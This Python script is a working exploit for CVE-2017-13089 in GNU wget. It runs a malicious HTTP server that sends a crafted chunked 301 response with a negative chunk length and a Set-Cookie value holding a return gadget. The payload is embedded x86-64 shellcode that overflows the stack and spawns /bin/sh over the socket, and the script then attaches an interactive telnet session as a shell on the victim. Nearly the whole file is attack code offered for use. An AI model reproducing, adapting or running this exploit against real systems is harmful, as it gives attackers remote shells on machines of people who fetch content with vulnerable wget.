#!/usr/bin/env python3

'''
http://git.savannah.gnu.org/cgit/wget.git/diff/src/http.c?id=d892291fb8ace4c3b734ea5125770989c215df3f&context=40&ignorews=0&dt=0
https://nvd.nist.gov/vuln/detail/CVE-2017-13089
'''

import socket, time, struct
import telnetlib

try:
    import keystone

    ks = keystone.Ks(keystone.KS_ARCH_X86, keystone.KS_MODE_64)
    with open('shellcode.S', 'r') as f: shellcode = f.read()
    shellcode, _ = ks.asm(shellcode)
    shellcode = bytes(shellcode)
except (ImportError, keystone.KsError, FileNotFoundError) as error:
    print('WARNING: {}\nUsing default shellcode...'.format(error))
    shellcode = (
                 b'\x31\xF6\x6A\x21\x58\x0F\x05\x6A\x01\x5E\x6A\x21\x58\x0F\x05\x6A\x02\x5E\x6A\x21\x58\x0F\x05'
                 b'\x31\xF6\x48\xBB\x2F\x62\x69\x6E\x2F\x2F\x73\x68\x56\x53\x54\x5F\x6A\x3B\x58\x31\xD2\x0F\x05'
                )

p64 = lambda x: struct.pack('<Q', x)

def prepare_content(shellcode):
    payload = shellcode

    # Prepare dlbuf with enough padding and
    while len(payload) & 7:
        payload += b'\x00'

    # overwrite remaining_chunk_size with a value smaller than the
    # read input size so it will result in a negative contlen
    # (and later length of fd_read). This causes fd_read to fail
    # and return from skip_short_body
    while len(payload) < 0x238:
        payload += p64(0x230)

    # Stack lifting and return into cookie :) :) :) :)
    payload += b'\x7c\x9b'

    # rsi points to payload
    # push rsi; ret
    # \xeb is encoded in UTF-8 with a 0xc3 prefix
    header = (
              'HTTP/1.1 301 Moved Permanently\n'
              'Server: nginx/1.4.6 (Ubuntu)\n'
              'Date: Mon, 30 Oct 2017 02:16:34 GMT\n'
              'Content-Type: text/html\n'
              'Content-Length: 193\n'
              'Set-Cookie: \x56\xeb\n'
              'Connection: keep-alive\n'
              'Transfer-Encoding: Chunked\n'
              'Location: https://kirschju.re/\n\n'
              '{:x}\n'.format(-2**32+len(payload))
             )

    return header, payload

def handle_client(connection, header, payload):
    connection.recv(1024)

    # Send header
    connection.send(header.encode())

    # The second fd_read, although called with a negative lenght
    # parameter, it has to try to read something in order to fail,
    # hence the additional empty byte
    connection.send(payload + b' ')

    time.sleep(.5)

    # Build a connection to the shell it has started
    t = telnetlib.Telnet()
    t.sock = connection
    try:
        t.interact()
    except Exception as ex:
        print(ex)
    finally:
        # Disconnect
        connection.close()
        sock.close()

if __name__ == '__main__':
    header, payload = prepare_content(shellcode)

    while True:
        try:
            # Bind the socket to the port
            sock = socket.socket()
            server_address = ('127.0.0.1', 55555)
            sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)

            sock.bind(server_address)

            sock.listen(256)

            # Wait for a connection
            print('Waiting for connection...')

            connection, client_address = sock.accept()

            print('Connected with {}'.format(client_address))
            handle_client(connection, header, payload)
        except KeyboardInterrupt:
            # Shutdown server
            sock.close()
            exit(0)
